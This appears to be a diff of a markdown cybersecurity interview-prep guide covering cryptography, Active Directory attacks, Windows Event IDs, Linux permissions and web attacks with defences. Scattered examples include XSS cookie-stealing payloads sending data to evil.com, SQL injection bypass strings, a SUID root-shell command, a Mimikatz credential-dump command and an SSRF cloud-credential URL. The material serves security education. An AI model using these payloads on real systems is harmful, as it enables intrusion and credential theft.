-> **Example:** An employee digitally signs a policy acceptance. They cannot later claim they didn't agree to it.
+> *Tool:* Nmap is the most common. `nmap -sV target` reveals open ports and service versions.
 
----
-
-**Q25. What is salting and why does it prevent rainbow table attacks?**
-
-A salt is a random unique value added to a password before hashing. It ensures identical passwords produce different hashes.
-
-> **Rainbow table attack:** Pre-computed hash→plaintext lookup table. Salting defeats this — a separate table would need to be computed for every possible salt value.
->
-> **Pepper:** A secret added at the application level (not stored in the DB) — an extra layer even if the database is stolen.
+> *Why it matters defensively:* Running a port scan against your own systems tells you what's exposed. Every unnecessary open port is an attack surface that should be closed.
 
 ---
 
-**Q26. What are bcrypt, scrypt, and Argon2 — and why are they preferred for passwords?**
+**35. What is the difference between black box, white box, and grey box testing?**
 
-They are intentionally **slow** (computationally expensive) hashing algorithms designed for password storage. Regular hashing algorithms (SHA-256) are fast — good for integrity, bad for passwords because attackers can try billions of guesses per second.
+These describe how much knowledge the tester has before starting:
 
-> **Example:** bcrypt on modern hardware: ~100ms per hash. At 100ms/hash, cracking 1 billion passwords takes ~3 years. With SHA-256 at nanoseconds: minutes.
-
----
-
-**Q27. What is Diffie-Hellman and where is it used?**
-
-A key exchange protocol allowing two parties to derive a shared secret over an insecure channel without transmitting the secret. Based on the discrete logarithm problem.
-
-Used in: **TLS** (ECDHE), **IPsec** (IKE), **SSH**.
-
-> **Perfect Forward Secrecy (PFS):** When Diffie-Hellman generates a new ephemeral key per session, even capturing today's traffic and stealing the server's private key tomorrow cannot decrypt it. Past sessions remain safe.
+- **Black box** — No prior knowledge. Simulates an external attacker who knows nothing about the target.
+- **White box** — Full knowledge: source code, architecture, credentials. Most thorough — nothing is hidden.
+- **Grey box** — Partial knowledge. Simulates an insider, a compromised account, or a vendor with limited access.
 
 ---
 
-**Q28. What is the difference between MD5, SHA-1, SHA-256, and SHA-3?**
-
-| Algorithm | Output | Status |
-|-----------|--------|--------|
-| MD5 | 128-bit | Broken — collision attacks proven |
-| SHA-1 | 160-bit | Deprecated — Google demonstrated collision (SHAttered) |
-| SHA-256 | 256-bit | Current standard — widely used |
-| SHA-3 | Variable | Modern alternative, different internal design |
-
-> **Interview rule:** Never recommend MD5 or SHA-1 for any security purpose. SHA-256 minimum. Argon2/bcrypt for passwords.
+## SECTION 3: COMMON ATTACKS & HOW TO DEFEND AGAINST THEM
+*The section interviewers use to see if you think like a defender.*
 
 ---
 
-**Q29. What is PKI?**
+**36. What is phishing and how do you defend against it?**
 
-Public Key Infrastructure — the system of policies, procedures, hardware, and software for managing digital certificates and public/private key pairs.
+Phishing is a deceptive email (or message) designed to trick the recipient into revealing credentials, clicking a malicious link, or opening a malicious attachment.
 
-Components: **Certificate Authority (CA)**, **Registration Authority (RA)**, **X.509 certificates**, **Certificate Revocation List (CRL)**, **OCSP**.
+**Variants:**
+- **Spear phishing** — Targeted at a specific individual, personalised using OSINT
+- **Whaling** — Spear phishing aimed at executives (CEO, CFO)
+- **Business Email Compromise (BEC)** — Impersonating executives to authorise fraudulent wire transfers
 
-> **Example:** When Chrome shows a padlock on `https://bank.com`, it has verified the bank's certificate was signed by a trusted CA — confirming you're talking to the real bank, not an impersonator.
-
----
-
-**Q30. What is a hash collision and why does it matter?**
-
-Two different inputs that produce the same hash output. This undermines integrity — an attacker could substitute one file for another and they'd have the same hash.
-
-> MD5 was broken when researchers demonstrated a collision in 2004. SHA-1 in 2017. Both are now retired from security use.
-
----
-
-## 4. ACTIVE DIRECTORY & WINDOWS SECURITY
+**Defences:**
+- Email authentication: SPF, DKIM, and DMARC (prevent spoofing)
+- Email gateway filtering (scan attachments, check URLs)
+- Security awareness training (teach users to spot red flags)
+- MFA (even if credentials are stolen, attacker can't log in)
+- Report button in email clients to make reporting frictionless
 
 ---
 
-**Q31. [CRITICAL] Explain the Active Directory structure.**
+**37. What are SPF, DKIM, and DMARC?**
 
-```
-Forest (top-level security boundary)
-  └── Domain (e.g., company.com)
-        └── Organizational Unit (OU) (e.g., IT, Finance)
-              └── Objects (Users, Computers, Groups, Printers)
-Domain Controller (DC) — runs AD, holds NTDS.dit database
-```
+Three email authentication standards that together prevent email spoofing:
 
----
+- **SPF (Sender Policy Framework)** — A DNS record that lists which servers are authorised to send email for your domain. If an email comes from an unlisted server, it fails SPF.
+- **DKIM (DomainKeys Identified Mail)** — A cryptographic signature added to emails. The receiver verifies it using a public key in your DNS. Proves the email wasn't tampered with in transit.
+- **DMARC** — A policy that tells receiving servers what to do when SPF or DKIM fails: `none` (just report), `quarantine` (move to spam), or `reject` (drop it entirely). Also sends reports back to you about who's sending email on your behalf.
 
-**Q32. [CRITICAL] What is the difference between an OU and a Group?**
-
-- **OU** — Administrative container. Apply **GPOs** to it. Represents your org chart.
-- **Group** — Assigns **resource permissions** (file shares, applications). Not a container.
-
-> **Rule:** You manage WITH OUs. You grant access WITH Groups.
+> *Together:* If an attacker tries to send an email pretending to be from your CEO, SPF fails (wrong server), DKIM fails (no valid signature), and DMARC rejects it. The target never sees it.
 
 ---
 
-**Q33. How does Kerberos authentication work?**
+**38. What is SQL Injection (SQLi) and how do you prevent it?**
 
-1. User logs in → sends encrypted timestamp to **KDC**
-2. KDC verifies → issues **TGT** (Ticket Granting Ticket) — encrypted with KRBTGT hash
-3. User presents TGT → requests **Service Ticket** for a specific service
-4. Service Ticket issued — encrypted with service account's hash
-5. User presents Service Ticket to service → access granted
+SQL injection inserts malicious SQL code into input fields that gets executed by the backend database.
 
-> **Analogy:** TGT = theme park wristband. Service Ticket = individual ride token. You don't re-prove payment every ride.
+> *Classic example:* Login form with username field. Attacker enters: `admin' --`
+> The query becomes: `SELECT * FROM users WHERE username = 'admin' --' AND password = '...'`
+> The `--` comments out the password check entirely. Attacker is logged in as admin.
 
----
+> *Impact:* Data theft, authentication bypass, deleting entire tables, in some cases system-level command execution.
 
-**Q34. What is a Golden Ticket attack?**
-
-Attacker compromises the **KRBTGT account hash** (by dumping NTDS.dit or via DCSync). They forge a TGT for any user with any privileges — valid for 10 years by default.
-
-> **Impact:** Complete domain compromise. Even changing passwords doesn't help — only rotating KRBTGT **twice** invalidates all Golden Tickets.
+**Prevention:**
+- **Parameterised queries / prepared statements** — The only reliable fix. User input is treated as data, never as part of the query structure.
+- Input validation and WAF as supporting controls, not primary fixes.
 
 ---
 
-**Q35. What is a Silver Ticket attack?**
+**39. What is Cross-Site Scripting (XSS)?**
 
-Using a **service account's hash**, attacker forges a Service Ticket for that specific service only. No KDC contact needed — harder to detect.
+An attacker injects malicious JavaScript into a web page that executes in another user's browser.
 
-> **Example:** Compromise `MSSQLSvc` hash → forge ticket for SQL server only → no KDC logs generated.
+**Types:**
+- **Stored XSS** — Malicious script is saved in the database (e.g., in a comment field) and executes for every user who views it.
+- **Reflected XSS** — Script is embedded in a URL; executes when the victim clicks the crafted link.
 
----
+> *Example impact:* Attacker posts a comment containing `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`. Every user who reads the comment has their session cookie sent to the attacker, who can then impersonate them.
 
-**Q36. What is Kerberoasting?**
-
-Any domain user can request a Service Ticket for services with SPNs. These tickets are encrypted with the service account's password hash. Attacker requests tickets → cracks offline with Hashcat.
-
-> **Defence:** Use gMSA (Group Managed Service Accounts) — auto-generated 120-character passwords that are practically uncrackable.
+**Prevention:** Output encoding (treat user input as text, not code), Content Security Policy (CSP) headers, HTTPOnly cookie flag (prevents JavaScript accessing cookies).
 
 ---
 
-**Q37. What is ASREPRoasting?**
+**40. What is Cross-Site Request Forgery (CSRF)?**
 
-Targets accounts with **Kerberos pre-authentication disabled**. Without pre-auth, KDC returns an AS-REP encrypted with the user's password hash — no identity verification required. Attacker cracks offline.
+Tricks an authenticated user's browser into sending a request to a website they're logged into — without their knowledge.
 
-> **Defence:** Always enable pre-authentication. Regularly audit AD for accounts with it disabled.
-
----
-
-**Q38. What is Pass-the-Hash?**
-
-Using a captured **NTLM hash** directly to authenticate — no need to crack the plaintext password. The hash IS the credential in NTLM.
-
-> **Tool:** Mimikatz, CrackMapExec. **Defence:** Credential Guard, disabling NTLM where possible, tiered administration model.
-
----
-
-**Q39. What is NTLM and what are its weaknesses?**
-
-NTLM uses Challenge-Response:
-1. Client requests connection
-2. Server sends random **nonce (challenge)**
-3. Client encrypts challenge with NTLM hash → sends response
-4. Server (or DC) verifies
-
-**Weaknesses:** Response can be captured and cracked (Net-NTLMv2) or relayed to another server (NTLM Relay). No mutual authentication — server identity not verified.
-
----
-
-**Q40. What is NTLM Relay / SMB Relay?**
-
-Attacker intercepts a victim's NTLM authentication and **replays it to another server**, authenticating as the victim — no hash cracking needed.
-
-> **Tool chain:** Responder (captures) + ntlmrelayx (relays)
-> **Defence:** **Enable SMB Signing** — cryptographically ties authentication to the specific connection. Relay becomes impossible.
-
----
-
-**Q41. What is LSASS and why is it a target?**
-
-LSASS (Local Security Authority Subsystem Service) manages all Windows authentication. It holds credential material in memory: NTLM hashes, Kerberos tickets, sometimes plaintext passwords (older systems).
-
-> **Mimikatz command:** `sekurlsa::logonpasswords`
-> **Defence:** Windows Credential Guard (virtualises LSASS memory), restrict SeDebugPrivilege, EDR monitoring of LSASS access.
-
----
-
-**Q42. What is DCSync?**
-
-Mimics a Domain Controller's replication request to pull all password hashes from AD without touching the DC's disk. Requires **Replicating Directory Changes All** privilege (Domain Admin level).
-
-> **Detection:** Monitor for Replication requests (Event ID 4662) from non-DC accounts.
-
----
-
-**Q43. What is the SAM database vs NTDS.dit?**
-
-- **SAM** (`C:\Windows\System32\config\SAM`) — Stores **local** account hashes. Cannot be read while Windows runs (Volume Shadow Copy or offline methods needed).
-- **NTDS.dit** — The Active Directory database on Domain Controllers. Stores **all domain account hashes**. Primary target for domain-wide credential theft.
-
----
-
-**Q44. What is LLMNR/NetBIOS poisoning?**
-
-LLMNR and NetBIOS resolve names when DNS fails by broadcasting queries to the whole subnet. Any host can respond — Responder tool answers these queries, captures Net-NTLMv2 hashes.
-
-> **Example:** User types `\\fileservre` (typo). PC broadcasts LLMNR query. Responder answers "I'm fileservre." Captures the authentication hash.
-> **Defence:** Disable LLMNR and NetBIOS via GPO.
-
----
-
-**Q45. What is UAC and how can it be bypassed?**
-
-UAC (User Account Control) prompts for elevation when admin privileges are requested, even for admin users who normally run with standard tokens.
-
-**Bypass techniques:** fodhelper, eventvwr, sdclt — these are Windows built-in programs that auto-elevate and can be hijacked to run arbitrary commands without a UAC prompt.
-
----
-
-**Q46. What is DLL Hijacking?**
-
-Windows searches for DLLs in a predictable order (application directory first, then system directories). Placing a malicious DLL where it's found first causes the application to load it with the application's privileges.
-
-> **Common scenario:** Application running as SYSTEM looks for `version.dll` in its own directory first. Attacker writes malicious `version.dll` there. System-level code execution.
-
----
-
-## 5. WINDOWS EVENT IDS & LOG ANALYSIS
-
-> **Why this section is critical:** This is the #1 tested area for SOC Analyst and Blue Team interviews. Interviewers will show you Event IDs and ask what happened, or describe a scenario and ask what Event IDs you'd look for.
-
----
-
-**Q47. [CRITICAL] What are the most important Windows Event IDs every security analyst must know?**
-
-**Authentication Events:**
-
-| Event ID | Description | Why It Matters |
-|----------|-------------|---------------|
-| **4624** | Successful logon | Baseline — check logon type |
-| **4625** | Failed logon | Brute force indicator |
-| **4634/4647** | Logoff | Session duration analysis |
-| **4648** | Logon with explicit credentials | Lateral movement indicator (RunAs, PtH) |
-| **4672** | Special privileges assigned at logon | Admin login — high-value |
-| **4768** | Kerberos TGT requested | Kerberos authentication start |
-| **4769** | Kerberos Service Ticket requested | Kerberoasting generates many of these |
-| **4771** | Kerberos pre-auth failed | Failed Kerberos login |
-| **4776** | NTLM authentication attempt | NTLM used instead of Kerberos |
-
-**Account Management:**
-
-| Event ID | Description | Why It Matters |
-|----------|-------------|---------------|
-| **4720** | User account created | New account — could be persistence |
-| **4722** | User account enabled | Disabled account re-enabled |
-| **4723/4724** | Password change/reset | Credential change |
-| **4728/4732/4756** | Member added to security group | Privilege escalation |
-| **4738** | User account changed | Account modification |
-| **4740** | Account locked out | Brute force indicator |
-
-**System & Process Events:**
-
-| Event ID | Description | Why It Matters |
-|----------|-------------|---------------|
-| **4688** | New process created | LOLBin abuse, malicious child processes |
-| **4697** | Service installed | Persistence mechanism |
-| **4698** | Scheduled task created | Persistence mechanism |
-| **4702** | Scheduled task updated | Persistence modification |
-| **4719** | System audit policy changed | Attacker disabling logging |
-| **4946/4947/4950** | Firewall rule added/changed | Attacker opening ports |
-
-**Critical Security Events:**
-
-| Event ID | Description | Why It Matters |
-|----------|-------------|---------------|
-| **1102** | Security audit log cleared | **IMMEDIATE ALERT** — attacker covering tracks |
-| **4616** | System time changed | Kerberos bypass attempt |
-| **4657** | Registry value modified | Persistence via registry |
-| **4663** | Access to object attempted | File/folder access |
-| **4662** | Directory service object accessed | DCSync detection |
-| **7045** | New service installed (System log) | Malware persistence |
-
----
-
-**Q48. [CRITICAL] What are the Logon Types in Event ID 4624 and why do they matter?**
-
-| Type | Name | Description | Security Relevance |
-|------|------|-------------|-------------------|
-| **2** | Interactive | Physical keyboard login | Normal |
-| **3** | Network | Access to shared folder/resource | Check source — lateral movement |
-| **4** | Batch | Scheduled task | Check task legitimacy |
-| **5** | Service | Service account login | Monitor for unusual service accounts |
-| **7** | Unlock | Workstation unlock | Normal |
-| **8** | NetworkCleartext | Credentials sent in plaintext | **Problem** — legacy auth |
-| **9** | NewCredentials | RunAs with /netonly | Used in Pass-the-Hash |
-| **10** | RemoteInteractive | RDP login | High-value — monitor closely |
-| **11** | CachedInteractive | Cached credentials login | Offline/domain unavailable |
-
-> **Interview scenario:** You see Event ID 4624 Logon Type 3 from a workstation account to a server at 3am. What do you think? Answer: Lateral movement — workstations normally don't authenticate to servers at 3am. Investigate that workstation.
-
----
-
-**Q49. [CRITICAL] You see Event ID 1102 in the Security log. What does this mean and what do you do?**
-
-Event ID 1102 means the **Security Audit Log was cleared**. This is a critical indicator — it almost always means an attacker is covering their tracks.
-
-**Immediate actions:**
-1. Do NOT touch the affected system further
-2. Isolate the system from the network
-3. Check your SIEM for logs forwarded before the clear
-4. Identify who cleared the log (the event includes the user account)
-5. Begin Incident Response
-
-> **Why it matters:** Smart attackers clear logs as one of their final steps before leaving or establishing persistent access. If you see this, assume compromise.
-
----
-
-**Q50. You're investigating a potential compromise. What Event IDs would you look for first?**
-
-**Step 1 — Was the log cleared?** Look for 1102.
-
-**Step 2 — Authentication activity:** 4624 (logins), 4625 (failed logins — pattern of many = brute force), 4648 (explicit credential use).
-
-**Step 3 — Privilege escalation:** 4672 (special privileges), 4728/4732/4756 (added to privileged groups).
-
-**Step 4 — Persistence:** 4698 (scheduled task), 4697 (service installed), 7045 (service installed — System log).
-
-**Step 5 — Process execution:** 4688 (process creation) — look for suspicious parent-child relationships.
-
-> **Classic red flag chain:** 4624 (login) → 4672 (special privileges) → 4688 (cmd.exe spawned) → 4688 (powershell.exe spawned by cmd.exe) → 4698 (scheduled task created).
-
----
-
-**Q51. What Event ID indicates Kerberoasting is occurring?**
-
-**Event ID 4769** — Kerberos Service Ticket (TGS) Requested.
-
-**What to look for:** Many 4769 events from a single user account requesting tickets for multiple different services in a short timeframe. Encryption type `0x17` (RC4-HMAC) in 4769 is suspicious — modern environments should use AES, and Kerberoasting tools request RC4 for easier cracking.
-
----
-
-**Q52. How would you detect a Pass-the-Hash attack using Event IDs?**
-
-Look for **Event ID 4624 with Logon Type 3** combined with:
-- Authentication Package: **NTLM** (not Kerberos)
-- Source workstation that doesn't match the typical login pattern
-- Account authenticating to multiple systems rapidly
-- **Event ID 4648** — logon with explicit credentials
-
-> **Key indicator:** In a modern AD environment, Kerberos should be used for most authentication. Unexpected NTLM (4776) across multiple systems from one account = suspicious.
-
----
-
-**Q53. What does Event ID 4688 tell you and how is it used for threat detection?**
-
-Event ID 4688 logs new process creation. When process command-line auditing is enabled, it captures the full command line — critical for detecting:
-
-- **LOLBin abuse:** `certutil.exe -decode`, `mshta.exe http://evil.com/payload`
-- **Malicious PowerShell:** Long base64-encoded commands in PowerShell
-- **Suspicious parent-child relationships:** Word.exe spawning powershell.exe (macro malware)
-- **Reconnaissance:** `net user /domain`, `whoami /groups`, `ipconfig /all` run by non-admin
-
-> **Enable:** Computer Configuration → Windows Settings → Security Settings → Advanced Audit Policy Configuration → Detailed Tracking → Process Creation. Also enable command-line logging via GPO.
-
----
-
-## 6. LINUX SECURITY
-
----
-
-**Q54. [CRITICAL] Explain the Linux filesystem hierarchy.**
-
-| Directory | Purpose |
-|-----------|---------|
-| `/` | Root — everything starts here |
-| `/etc` | Configuration files |
-| `/var/log` | Log files |
-| `/home` | User home directories |
-| `/root` | Root user's home |
-| `/bin` | Essential commands (all users) |
-| `/sbin` | System commands (root only) |
-| `/usr/bin` | User programs |
-| `/tmp` | Temp files — world-writable, sticky bit set |
-| `/proc` | Virtual FS — kernel/process runtime data |
-| `/dev` | Device files |
-| `/mnt`, `/media` | Mount points |
-
----
-
-**Q55. [CRITICAL] How do Linux file permissions work?**
-
-Format: `[type][owner rwx][group rwx][others rwx]`
-
-Example: `-rwxr-xr--`
-- `-` = regular file
-- `rwx` = owner can read, write, execute
-- `r-x` = group can read, execute
-- `r--` = others can only read
-
-**Numeric:** r=4, w=2, x=1. `chmod 755` = 7(rwx) 5(r-x) 5(r-x)
-
-`chown user:group file` — changes ownership
-`chmod permissions file` — changes permissions
-
----
-
-**Q56. What is the SUID bit and why is it dangerous?**
-
-SUID causes a program to execute with the **file owner's privileges** (often root), regardless of who runs it.
-
-**Legitimate use:** `/usr/bin/passwd` needs root to write `/etc/shadow`.
-
-**Security risk:** If `find`, `python`, `bash`, or `vim` have SUID root, any user can get a root shell.
-
-> **Check:** `find / -perm -4000 -type f 2>/dev/null`
-> **Example exploit:** `find . -exec /bin/bash -p \;` — if find has SUID root, this drops you into a root shell.
-
----
-
-**Q57. What is the sticky bit and where is it used?**
-
-When set on a directory, only the file owner (or root) can delete their own files — even if others have write access to the directory.
-
-> **Default:** `/tmp` has sticky bit (`drwxrwxrwt` — the `t` indicates sticky bit). Without it, anyone could delete anyone's temp files.
-
----
-
-**Q58. What is /etc/passwd vs /etc/shadow?**
-
-- `/etc/passwd` — World-readable. Contains username, UID, GID, home dir, shell. Password field shows `x`.
-- `/etc/shadow` — Root-readable only. Contains password hashes, expiry dates.
-
-> **Why separated:** If hashes were in world-readable `/etc/passwd`, every local user could attempt to crack them offline.
-
----
-
-**Q59. What is sudoers and how do you harden it?**
-
-`/etc/sudoers` defines who can run what with sudo. Always edit with `visudo` (validates syntax before saving).
-
-**Hardening:**
-- Use specific command paths: `john ALL=(ALL) /usr/bin/apt` (not `ALL`)
-- Enable sudo logging: `Defaults logfile=/var/log/sudo.log`
-- Require password: never set `NOPASSWD` unless absolutely necessary
-- Audit regularly: `sudo -l -U username`
-
----
-
-**Q60. What are the most important Linux log files for security?**
-
-| File | Contents |
-|------|---------|
-| `/var/log/auth.log` | SSH logins, sudo, su, PAM authentication |
-| `/var/log/syslog` | General system events |
-| `/var/log/kern.log` | Kernel messages |
-| `/var/log/apache2/access.log` | Web server requests |
-| `/var/log/apache2/error.log` | Web server errors |
-| `/var/log/fail2ban.log` | Blocked IPs (if fail2ban installed) |
-| `/var/log/audit/audit.log` | Auditd — detailed security events |
-
-> **For systemd systems:** `journalctl -u ssh` (SSH logs), `journalctl -p err` (error level and above).
-
----
-
-**Q61. What is AppArmor and how does it work?**
-
-Linux Mandatory Access Control (MAC) system. Each application gets a profile restricting what files, capabilities, and network access it may use. Even a compromised application cannot exceed its profile.
-
-> **Example:** AppArmor profile for nginx allows reading `/var/www/html` but denies access to `/etc/shadow`. Nginx compromise doesn't expose password hashes.
-
----
-
-**Q62. What is the difference between a local variable and an environment variable in Linux?**
-
-- **Local:** `x=5` — exists only in current shell session. Child processes cannot see it.
-- **Environment:** `export x=5` — inherited by all child processes.
-
-> Common environment variables: `$PATH`, `$HOME`, `$USER`, `$SHELL`
-> `env` — lists all environment variables. Security concern: credentials or secrets accidentally placed in environment variables.
-
----
-
-## 7. ATTACK TECHNIQUES & EXPLOITATION
-
----
-
-**Q63. [CRITICAL] What is the Cyber Kill Chain?**
-
-Lockheed Martin's 7-stage attack model:
-
-| Stage | Description | Defender Response |
-|-------|-------------|------------------|
-| Reconnaissance | Research target | Limit public exposure (OSINT reduction) |
-| Weaponisation | Build payload/exploit | Threat intel on new exploits |
-| Delivery | Send payload (phishing, USB) | Email filtering, user training |
-| Exploitation | Trigger vulnerability | Patch management, EDR |
-| Installation | Establish persistence | EDR, application control |
-| C2 | Remote control channel | DNS/proxy filtering, network monitoring |
-| Actions on Objectives | Exfil, ransomware, destruction | DLP, segmentation, backups |
-
-> **Key point:** Defenders win by breaking the chain at **any** stage. You don't need to catch everything — stop it somewhere.
-
----
-
-**Q64. [CRITICAL] What is MITRE ATT&CK and how is it used?**
-
-A publicly maintained knowledge base of real-world adversary tactics, techniques, and procedures (TTPs) organized by attack phase.
-
-**Practical uses:**
-- **Threat Hunting:** "APT29 uses T1059.001 (PowerShell execution). Do we have detections for that?"
-- **Detection Engineering:** Writing SIEM rules mapped to ATT&CK techniques
-- **Gap Analysis:** "Which ATT&CK techniques do we have no coverage for?"
-- **Red Team Planning:** Build attack simulations based on relevant threat actors
-
----
-
-**Q65. What is the difference between passive and active reconnaissance?**
-
-- **Passive:** No direct contact — OSINT, WHOIS, Shodan, LinkedIn, DNS lookups, job postings, GitHub. No traces on target.
-- **Active:** Direct interaction — port scanning, banner grabbing, ping sweeps. Leaves network traces, detectable.
-
-> **Legal note:** Active recon without written permission is illegal. Passive recon on public information is generally legal.
-
----
-
-**Q66. What is SQL Injection and how do you prevent it?**
-
-User-supplied input is embedded directly into a SQL query without sanitisation, allowing the attacker to modify the query's logic.
-
-> **Example:**
-> Input: `' OR 1=1 --`
-> Query becomes: `SELECT * FROM users WHERE user='' OR 1=1 --' AND pass='...'`
-> Result: Returns ALL users — authentication bypassed.
->
-> **Types:** Classic, Blind (Boolean/Time-based), Out-of-band
-> **Prevention:** **Parameterised queries (prepared statements)** — the only reliable fix. Input validation and WAF are supporting controls.
-
----
-
-**Q67. What is Cross-Site Scripting (XSS)?**
-
-Injecting malicious JavaScript into a web page that executes in other users' browsers.
-
-- **Stored XSS** — Payload saved in DB, executes for every visitor
-- **Reflected XSS** — Payload in URL, executes when victim clicks link
-- **DOM-based XSS** — Client-side DOM manipulation, server never sees the payload
-
-> **Example (Stored):** Attacker posts: `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>` in a comment. Every visitor sends their session cookie to the attacker.
->
-> **Prevention:** Output encoding, Content Security Policy (CSP), HTTPOnly cookie flag.
-
----
-
-**Q68. What is privilege escalation?**
-
-Gaining higher privileges than originally granted.
-
-- **Vertical:** Standard user → Admin/Root
-- **Horizontal:** User A accessing User B's resources at the same privilege level
-
-**Common techniques:**
-- Linux: SUID exploitation, sudo misconfiguration, kernel exploits, writable `/etc/passwd`
-- Windows: UAC bypass, DLL hijacking, unquoted service paths, token impersonation
-
----
-
-**Q69. What is lateral movement?**
-
-After initial compromise, moving to other systems within the network to expand access.
-
-**Techniques:** Pass-the-Hash, Pass-the-Ticket, PsExec, WMI, WinRM, RDP, SMB shares, Cobalt Strike's `jump` command.
-
-> **Detection:** Unusual Logon Type 3 (network auth) from workstations to servers, service installations (4697) on systems an account doesn't normally touch, NTLM authentication where Kerberos is expected.
-
----
-
-**Q70. What are LOLBins (Living off the Land Binaries)?**
-
-Legitimate Windows system tools abused by attackers because they're signed by Microsoft, trusted, and already present — bypassing application whitelisting and reducing AV detections.
-
-| Binary | Abuse |
-|--------|-------|
-| `certutil.exe` | Download files, decode base64 |
-| `mshta.exe` | Execute remote HTML applications (HTA) |
-| `regsvr32.exe` | Execute remote DLLs (Squiblydoo) |
-| `rundll32.exe` | Execute DLL exports |
-| `wscript/cscript.exe` | Execute VBScript/JScript |
-| `powershell.exe` | Nearly everything |
-| `bitsadmin.exe` | Download files |
-| `wmic.exe` | Lateral movement, process execution |
-
-> **Detection:** These binaries making network connections, spawning unusual child processes, or running with base64-encoded command lines are all red flags. Event ID 4688 with command-line logging captures these.
-
----
-
-**Q71. What is a CSRF attack and how is it prevented?**
-
-Cross-Site Request Forgery — tricking an authenticated user's browser into sending an unintended request to a site they're logged into.
-
-> **Example:** User logged into bank.com visits evil.com, which has:
+> *Example:* You're logged into your bank. You visit an attacker's page containing:
 > `<img src="https://bank.com/transfer?to=attacker&amount=5000">`
-> Browser sends request with session cookie → bank processes transfer.
->
-> **Prevention:** CSRF tokens (unique, per-session value in forms), SameSite cookie attribute, re-authentication for sensitive actions.
+> Your browser loads the image, which sends the transfer request with your session cookie. The bank processes it as legitimate.
+
+**Prevention:** CSRF tokens (a unique secret in every form that the attacker can't predict), SameSite cookie attribute, re-authentication for sensitive actions.
 
 ---
 
-**Q72. What is SSRF (Server-Side Request Forgery)?**
+**41. What is a brute force attack and how do you stop it?**
 
-Attacker makes the server issue requests to unintended targets — often internal services inaccessible from outside.
+Systematically trying every possible combination of credentials until one works.
 
-> **Classic example:** `?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name` — AWS metadata endpoint. Server fetches it and returns cloud IAM credentials to the attacker.
->
-> **Prevention:** Allowlist permitted URLs/IPs, disable unnecessary URL-fetching features.
+**Variants:**
+- **Dictionary attack** — Uses a list of common passwords (rockyou.txt) rather than every possible combination
+- **Credential stuffing** — Using stolen username/password pairs from other breaches to try against new targets
 
----
-
-**Q73. What is a buffer overflow?**
-
-Writing more data into a buffer than it was allocated for, overflowing into adjacent memory — potentially overwriting the return address to redirect execution.
-
-> **Example:** Program allocates 100 bytes for input. Attacker sends 200 bytes. The extra 100 bytes overflow the stack, overwriting the return address with the address of attacker's shellcode.
->
-> **Modern mitigations:** ASLR (randomise memory layout), DEP/NX (non-executable stack), Stack Canaries, SafeSEH.
+**Defences:**
+- Account lockout after N failed attempts
+- Rate limiting on login endpoints
+- CAPTCHA to prevent automated attempts
+- MFA — even if password is found, attacker can't log in
+- Password managers encouraging strong, unique passwords
 
 ---
 
-**Q74. What is the difference between Threat Hunting and Threat Intelligence?**
+**42. What is a rainbow table attack and how does salting prevent it?**
 
-- **Threat Intelligence:** External data collection — who is attacking, what TTPs they use, what IoCs are known. Reactive input. *"What might come at us?"*
-- **Threat Hunting:** Proactive internal investigation using intelligence as a guide. Analysts form hypotheses and hunt through logs/telemetry. *"Is it already inside?"*
+A rainbow table is a pre-computed database of hash values and their corresponding plaintext passwords. Instead of cracking a hash (which takes time), an attacker just looks it up.
 
-> **Example workflow:** Intel says APT29 uses PowerShell for execution (T1059.001) → Hunter creates hypothesis: "Do we have unusual PowerShell spawning processes?" → Hunts SIEM/EDR logs → Finds anomaly → Begins investigation.
+**How salting defeats it:** Before hashing, a random unique value (the salt) is added to each password. `SHA256("password" + "xK9mZ")` produces a completely different hash than `SHA256("password" + "pQ3rT")`. The attacker would need a separate rainbow table for every possible salt — making pre-computation infeasible.
+
+> *Best practice:* Use bcrypt, scrypt, or Argon2 for password hashing — they're intentionally slow and include salting automatically.
 
 ---
 
-**Q75. What is social engineering? Name the main types.**
+**43. What is malware? Name the main types.**
 
-Psychological manipulation to gain access, information, or trust.
+Malware (malicious software) is any software designed to harm, exploit, or unauthorisedly access systems.
 
-| Type | Description |
+| Type | What it does |
 |------|-------------|
-| Phishing | Mass email fraud |
-| Spear Phishing | Targeted, personalised phishing |
-| Whaling | Spear phishing at C-level executives |
-| Vishing | Voice call deception |
-| Smishing | SMS-based phishing |
-| Pretexting | Fabricated scenario to build trust |
-| Baiting | Leaving infected USB drives for victims to plug in |
-| Tailgating | Following someone through a secured door |
+| **Virus** | Attaches to legitimate files; spreads when files are shared |
+| **Worm** | Self-replicates and spreads across networks without human interaction |
+| **Trojan** | Disguised as legitimate software; user installs it voluntarily |
+| **Ransomware** | Encrypts files and demands payment for the decryption key |
+| **Spyware** | Monitors user activity and sends data to the attacker |
+| **Keylogger** | Records keystrokes to capture passwords and sensitive data |
+| **Rootkit** | Hides itself and other malware from the OS and security tools |
+| **Botnet** | Network of infected machines controlled remotely |
+| **Adware** | Displays unwanted ads; often bundled with free software |
 
 ---
 
-## 8. DEFENSE, DETECTION & MONITORING
+**44. What is ransomware and what is the recommended defence strategy?**
+
+Ransomware encrypts a victim's files and demands a ransom for the decryption key. Modern ransomware also exfiltrates data first and threatens to publish it (double extortion).
+
+**Defence strategy:**
+- **Backups** following the 3-2-1 rule: 3 copies, 2 different media types, 1 offsite/offline — and test restoration regularly
+- **Patch management** — Ransomware often spreads via known vulnerabilities
+- **Email filtering** — Most ransomware enters via phishing
+- **Endpoint protection / EDR** — Detect ransomware behaviour before encryption spreads
+- **Network segmentation** — Limits how far ransomware can spread
+- **Least privilege** — If the infected account can't access network shares, ransomware can't encrypt them
 
 ---
 
-**Q76. [CRITICAL] What is a SIEM and how does it work?**
+**45. What is a zero-day vulnerability?**
 
-SIEM (Security Information and Event Management) centralises log collection, correlates events across sources, and generates alerts.
+A vulnerability that is unknown to the software vendor and the public — meaning there is no patch available. Attackers who discover them can exploit them with no defences in place.
+
+> *Name origin:* The vendor has had "zero days" to fix it.
+
+> *Why it's serious:* Even fully patched, up-to-date systems are vulnerable. Defence relies on behaviour-based detection (EDR, anomaly detection) rather than signature-based tools.
+
+---
+
+**46. What is privilege escalation?**
+
+Gaining more system access than you were originally granted.
+
+- **Vertical escalation** — Going from a standard user to admin/root
+- **Horizontal escalation** — Accessing another user's data or account at the same privilege level
+
+> *Example (vertical, Linux):* A standard user finds a program with the SUID bit set (it runs as root regardless of who executes it). They exploit it to spawn a root shell.
+
